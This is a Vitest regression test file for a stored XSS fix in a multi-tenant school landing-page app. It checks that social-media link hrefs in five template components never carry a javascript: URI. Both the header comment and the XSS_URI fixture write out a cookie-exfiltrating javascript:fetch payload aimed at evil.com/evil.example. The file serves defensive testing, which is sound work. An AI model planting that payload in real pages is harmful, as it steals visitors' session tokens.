/**
 * Stored XSS via javascript: URI in tenant social-media links (9th
 * systematic audit sweep, 2026-09-28). Any tenant admin could set
 * facebook/instagram/twitter/youtube/linkedin_url to
 * "javascript:fetch('https://evil.com/?c='+document.cookie)" via the
 * landing-page-settings endpoint (backend/app/schemas/tenants.py had no
 * protocol validation), and every public, unauthenticated landing-page
 * template rendered it straight into an <a href={...}> with no
 * sanitization — target="_blank" rel="noopener noreferrer" only blocks
 * window.opener access, it does not neutralize a javascript: URI, which
 * still executes on click. Since the same origin also serves the
 * authenticated app (JWT in localStorage, src/api/client.ts), a staff/admin
 * user previewing their own public page could have their session token
 * exfiltrated.
 *
 * Fixed by routing every social-link href through the existing
 * sanitizeUrl() helper (src/lib/sanitize.ts, already used correctly
 * elsewhere — see Hero.test.tsx) in all 5 affected components. Tests the
 * call site, not just sanitizeUrl() in isolation (already covered by
 * src/lib/__tests__/sanitize.test.ts) — same discipline as
 * PublicPageView.sections.test.tsx.
 */
import { render } from "@testing-library/react";
import { QueryClient, QueryClientProvider } from "@tanstack/react-query";
import { HelmetProvider } from "react-helmet-async";
import { MemoryRouter } from "react-router-dom";
import { describe, expect, it, vi } from "vitest";

import { HighSchoolTemplate } from "../HighSchoolTemplate";
import { UniversityTemplate } from "../UniversityTemplate";
import { DefaultLandingTemplate } from "../DefaultLandingTemplate";
import { PublicFooter } from "@/pages/public/PublicPageView";
import { PremiumFooter } from "@/public-site/sections/PremiumFooter";
import { DEFAULT_TOKENS } from "@/public-site/theme/tokens";
import type { TenantPublicResponse, TenantLandingSettings } from "@/types/tenant";

vi.mock("@/api/client", () => ({
  apiClient: { get: vi.fn().mockResolvedValue({ data: [] }), post: vi.fn() },
}));

const XSS_URI = "javascript:fetch('https://evil.example/?c='+document.cookie)";

function makeSettings(overrides: Partial<TenantLandingSettings> = {}): TenantLandingSettings {
  return {
    primary_color: "#1e3a5f",
    gallery: [],
    announcements: [],
    show_stats: true,
    show_programs: true,
    facebook: XSS_URI,
    instagram: XSS_URI,
    twitter: XSS_URI,
    youtube: XSS_URI,
    linkedin_url: XSS_URI,
    ...overrides,
  };
}

function makeTenant(overrides: Partial<TenantPublicResponse> = {}): TenantPublicResponse {
  return {
    id: "t1",
    name: "École Test",
    slug: "ecole-test",
    type: "high",
    is_active: true,
    landing: makeSettings(),
    ...overrides,
  };
}

function renderWithProviders(children: React.ReactNode) {
  const queryClient = new QueryClient({ defaultOptions: { queries: { retry: false } } });
  return render(
    <HelmetProvider>
      <QueryClientProvider client={queryClient}>
        <MemoryRouter>{children}</MemoryRouter>
      </QueryClientProvider>
    </HelmetProvider>,
  );
}

function assertNoJavascriptHref(container: HTMLElement) {
  const anchors = Array.from(container.querySelectorAll("a"));
  const hrefs = anchors.map((a) => a.getAttribute("href"));
  for (const href of hrefs) {
    expect(href?.toLowerCase().startsWith("javascript:")).toBe(false);
  }
}

describe("Social-link hrefs never carry a javascript: URI", () => {
  it("HighSchoolTemplate", () => {
    const { container } = renderWithProviders(
      <HighSchoolTemplate tenant={makeTenant()} settings={makeSettings()} />,
    );
    assertNoJavascriptHref(container);
  });

  it("UniversityTemplate", () => {
    const { container } = renderWithProviders(
      <UniversityTemplate tenant={makeTenant({ type: "university" })} settings={makeSettings()} />,
    );
    assertNoJavascriptHref(container);
  });

  it("DefaultLandingTemplate", () => {
    const { container } = renderWithProviders(
      <DefaultLandingTemplate tenant={makeTenant()} settings={makeSettings()} />,
    );
    assertNoJavascriptHref(container);
  });

  it("PublicFooter (PublicPageView.tsx)", () => {
    const { container } = renderWithProviders(
      <PublicFooter
        tenantName="École Test"
        tenantSlug="ecole-test"
        primaryColor="#1e3a5f"
        secondaryColor="#1e3a5f"
        settings={makeSettings()}
      />,
    );
    assertNoJavascriptHref(container);
  });

  it("PremiumFooter", () => {
    const { container } = render(
      <MemoryRouter>
        <PremiumFooter
          tenantName="École Test"
          navLinks={[]}
          facebookUrl={XSS_URI}
          twitterUrl={XSS_URI}
          linkedinUrl={XSS_URI}
          tokens={DEFAULT_TOKENS}
        />
      </MemoryRouter>,
    );
    assertNoJavascriptHref(container);
  });

  it("a legitimate https:// social link still works (surgical fix, not a blanket strip)", () => {
    const { container } = renderWithProviders(
      <HighSchoolTemplate
        tenant={makeTenant()}
        settings={makeSettings({ facebook: "https://facebook.com/ecole-test" })}
      />,
    );
    expect(container.querySelector('a[href="https://facebook.com/ecole-test"]')).toBeInTheDocument();
  });
});
